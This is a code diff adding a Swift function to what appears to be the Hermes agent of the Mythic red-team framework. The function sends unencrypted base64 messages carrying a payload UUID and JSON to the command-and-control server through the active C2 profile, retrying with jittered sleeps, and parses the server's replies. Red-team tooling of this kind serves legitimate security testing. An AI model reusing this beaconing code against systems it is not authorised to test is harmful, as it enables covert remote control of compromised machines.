@@ -103,3 +103,35 @@ func sendHermesMessage(jsonMessage: JSON, payloadUUID: Data, decodedAESKey: Data
     
     return jsonResponse
 }
+
+// Wrapper to send plaintext Hermes message (no encryption) using the active C2 profile
+// Used when encrypted_exchange_check is false
+func sendPlaintextHermesMessage(jsonMessage: JSON) -> JSON {
+    let payloadUUID = Data(agentConfig.payloadUUID.utf8)
+    
+    // Assemble message B64(PayloadUUID + JSON)
+    let jsonData = try! jsonMessage.rawData()
+    let hermesMessage = toBase64(data: payloadUUID + jsonData)
+
+    // Send message through the active C2 profile
+    var mythicMessage = "NO_CONNECT"
+    while mythicMessage == "NO_CONNECT" {
+        mythicMessage = profileManager.send(data: hermesMessage)
+        if mythicMessage == "NO_CONNECT" {
+            sleepWithJitter()
+        }
+    }
+    
+    // Decode plaintext Mythic response (B64(PayloadUUID + JSON))
+    let decodedResponse = fromBase64(data: mythicMessage)
+    
+    // Extract JSON after the 36-byte UUID prefix
+    if decodedResponse.count > 36 {
+        let jsonData = decodedResponse.subdata(in: 36..<decodedResponse.count)
+        let jsonString = toString(data: jsonData)
+        let jsonResponse = JSON.init(parseJSON: jsonString)
+        return jsonResponse
+    }
+    
+    return JSON()
+}
